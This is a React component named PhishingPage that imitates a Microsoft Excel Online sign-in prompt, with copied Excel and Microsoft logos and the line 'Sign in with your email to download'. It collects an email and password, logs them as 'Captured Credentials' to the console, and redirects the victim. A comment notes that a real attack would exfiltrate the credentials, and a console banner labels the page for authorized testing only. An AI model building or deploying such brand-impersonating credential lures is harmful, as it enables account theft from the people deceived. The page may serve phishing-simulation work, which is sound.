"use client";

import { useState } from 'react';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';

const ExcelLogo = () => (
    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M14 2L6 2 6 22 18 22 18 8 14 2z" fill="#107C41"/>
        <path d="M13 3.5L13 9 17 9" fill="#107C41" stroke="#fff" strokeWidth="1"/>
        <path d="M12.28 12.5l-3.36 5.82 3.2 5.53h-3.32l-1.92-3.33-1.92 3.33H5.5l3.2-5.53L5.32 12.5h3.32l1.92 3.33 1.92-3.33h3.4z" fill="#fff"/>
    </svg>
);

const MicrosoftLogo = () => (
    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M0 0H7.5V7.5H0V0Z" fill="#F25022"/>
        <path d="M8.5 0H16V7.5H8.5V0Z" fill="#7FBA00"/>
        <path d="M0 8.5H7.5V16H0V8.5Z" fill="#00A4EF"/>
        <path d="M8.5 8.5H16V16H8.5V8.5Z" fill="#FFB900"/>
    </svg>
);


export function PhishingPage() {
  const [email, setEmail] = useState('judy@');
  const [password, setPassword] = useState('');
  const [submitted, setSubmitted] = useState(false);

  const handleClick = () => {
    if(email && password) {
        console.warn('--- FOR AUTHORIZED TESTING ONLY ---');
        console.log('Captured Credentials:');
        console.log('Email:', email);
        console.log('Password:', password);
        console.warn('---------------------------------');
        setSubmitted(true);
        // In a real scenario, you would exfiltrate credentials and then redirect.
        // For this demo, we just redirect after a short delay.
        setTimeout(() => {
            window.location.href = 'https://www.google.com/search?q=excel';
        }, 1500);
    }
  };

  if (submitted) {
    return (
        <Card className="w-full max-w-sm shadow-2xl bg-[#008033]/95 border-gray-400/50 text-white rounded-lg">
            <CardContent className="p-8 text-center">
                <p>Verifying, please wait...</p>
            </CardContent>
        </Card>
    );
  }

  return (
    <Card className="w-full max-w-sm shadow-2xl bg-[#008033]/95 text-white rounded-lg border-gray-400/50">
      <CardHeader className="flex flex-col items-start text-left p-6 space-y-2">
        <div className='flex justify-between w-full items-center'>
            <div className="flex items-center gap-2">
                <ExcelLogo />
                <div>
                    <CardTitle className="text-xl font-semibold">Excel</CardTitle>
                    <p className='text-xs text-gray-200'>Online Viewer</p>
                </div>
            </div>
            <div className='flex items-center gap-1.5'>
                <MicrosoftLogo />
                <span className='text-xs font-semibold'>Microsoft</span>
            </div>
        </div>
      </CardHeader>
      <CardContent className="px-6 pb-6 pt-2">
        <CardDescription className="text-white text-center text-base mb-6">
            Sign in with your email to download.
        </CardDescription>
        <div className="flex flex-col space-y-4">
            <div>
              <Label htmlFor="email" className="sr-only">Email</Label>
              <Input 
                id="email" 
                type="email" 
                placeholder="Enter your email" 
                className="bg-white text-black placeholder:text-gray-500 rounded-md" 
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
            <div>
              <Label htmlFor="password" className="sr-only">Password</Label>
              <Input 
                id="password" 
                type="password" 
                placeholder="Enter your password" 
                className="bg-white text-black placeholder:text-gray-500 rounded-md"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
          <Button 
            onClick={handleClick} 
            className="w-full h-12 text-base font-semibold bg-[#0078D4] hover:bg-[#005a9e] rounded-md"
          >
            View Document
          </Button>
        </div>
      </CardContent>
    </Card>
  );
}
